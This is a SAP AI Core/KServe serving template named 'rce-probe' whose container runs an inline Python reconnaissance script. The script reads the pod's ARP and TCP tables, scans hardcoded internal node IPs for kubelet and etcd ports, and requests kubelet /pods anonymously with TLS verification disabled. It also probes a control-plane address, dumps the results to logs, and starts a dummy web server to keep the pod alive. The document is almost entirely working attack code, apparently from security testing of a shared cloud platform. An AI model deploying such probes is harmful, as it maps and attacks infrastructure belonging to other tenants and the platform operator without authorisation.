apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.12.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "node-ip-arp-tcp-kubelet-scan"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, ssl, struct, threading

            print('[PROBE_V412_START]', flush=True)

            def emit(label, data):
                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                for i in range(0, max(1, len(flat)), 4000):
                    print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)

            # ── 1. ARP table ──────────────────────────────────────────────────────
            try:
                with open('/proc/net/arp') as f:
                    emit('ARP_TABLE', f.read())
            except Exception as e:
                emit('ARP_ERR', str(e))

            # ── 2. TCP connections ─────────────────────────────────────────────────
            try:
                with open('/proc/net/tcp') as f:
                    emit('NET_TCP', f.read())
            except Exception as e:
                emit('NET_TCP_ERR', str(e))

            # ── 3. Pod own IP ─────────────────────────────────────────────────────
            try:
                with open('/proc/net/fib_trie') as f:
                    trie = f.read()
                # Find LOCAL entries which are our own IPs
                local_ips = []
                lines = trie.splitlines()
                for i, line in enumerate(lines):
                    if 'LOCAL' in line:
                        # Go back to find the IP
                        for j in range(i, max(0, i-3), -1):
                            import re
                            m = re.search(r'(\d+\.\d+\.\d+\.\d+)', lines[j])
                            if m and not m.group(1).startswith('127') and not m.group(1).startswith('255'):
                                local_ips.append(m.group(1))
                                break
                emit('OWN_IPS', list(set(local_ips)))
            except Exception as e:
                emit('FIB_ERR', str(e))

            # ── 4. Quick TCP probe of known node IPs for kubelet ──────────────────
            # Node IPs from OTel topology dump
            NODE_IPS = [
                '10.180.1.74', '10.180.12.215', '10.180.13.45',
                '10.180.35.242',
            ]
            def tcp_probe(ip, port, timeout=3):
                try:
                    s = socket.socket(); s.settimeout(timeout)
                    s.connect((ip, port))
                    s.close()
                    return 'OPEN'
                except socket.timeout:
                    return 'TIMEOUT'
                except Exception as e:
                    return f'ERR:{e}'

            for nip in NODE_IPS:
                for port in [10255, 10250, 10249, 2379, 2380]:
                    r = tcp_probe(nip, port, timeout=3)
                    emit(f'NODE_{nip}_{port}', r)

            # ── 5. HTTP to kubelet read-only :10255 on each node ─────────────────
            for nip in NODE_IPS:
                for kpath in ['/pods', '/healthz', '/stats/summary']:
                    try:
                        s = socket.socket(); s.settimeout(5)
                        s.connect((nip, 10255))
                        req = f'GET {kpath} HTTP/1.0\r\nHost: {nip}:10255\r\n\r\n'
                        s.sendall(req.encode())
                        resp = b''
                        while True:
                            c = s.recv(65536)
                            if not c: break
                            resp += c
                        s.close()
                        emit(f'KUBELET_RO_{nip}_{kpath.replace(\"/\",\"_\")}', resp[:2000].decode(errors='replace'))
                    except Exception as e:
                        emit(f'KUBELET_RO_ERR_{nip}_{kpath.replace(\"/\",\"_\")}', str(e))

            # ── 6. Kubelet HTTPS :10250 (anonymous) ────────────────────────────────
            for nip in NODE_IPS:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = socket.socket(); s.settimeout(6)
                    ss = ctx.wrap_socket(s, server_hostname=nip)
                    ss.connect((nip, 10250))
                    req = f'GET /pods HTTP/1.0\r\nHost: {nip}:10250\r\n\r\n'
                    ss.sendall(req.encode())
                    resp = b''
                    while True:
                        c = ss.recv(65536)
                        if not c: break
                        resp += c
                    ss.close()
                    emit(f'KUBELET_HTTPS_{nip}', resp[:1500].decode(errors='replace'))
                except Exception as e:
                    emit(f'KUBELET_HTTPS_ERR_{nip}', str(e))

            # ── 7. etcd probe on known node IPs ───────────────────────────────────
            # etcd usually on control plane, not worker nodes — but try anyway
            CTRL_IPS = ['10.250.0.0']  # from envoy config
            for cip in CTRL_IPS:
                for port in [2379, 2380, 8080]:
                    r = tcp_probe(cip, port, timeout=3)
                    emit(f'CTRL_{cip}_{port}', r)

            # ── 8. DNS resolution to discover node IPs ────────────────────────────
            dns_names = [
                'kubernetes.default.svc.cluster.local',
                'kube-dns.kube-system.svc.cluster.local',
            ]
            for dn in dns_names:
                try:
                    ip = socket.gethostbyname(dn)
                    emit(f'DNS_{dn}', ip)
                except Exception as e:
                    emit(f'DNS_ERR_{dn}', str(e))

            # ── 9. /proc/net/dev — interface stats ────────────────────────────────
            try:
                with open('/proc/net/dev') as f:
                    emit('NET_DEV', f.read())
            except Exception as e:
                emit('NET_DEV_ERR', str(e))

            print('[PROBE_V412_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
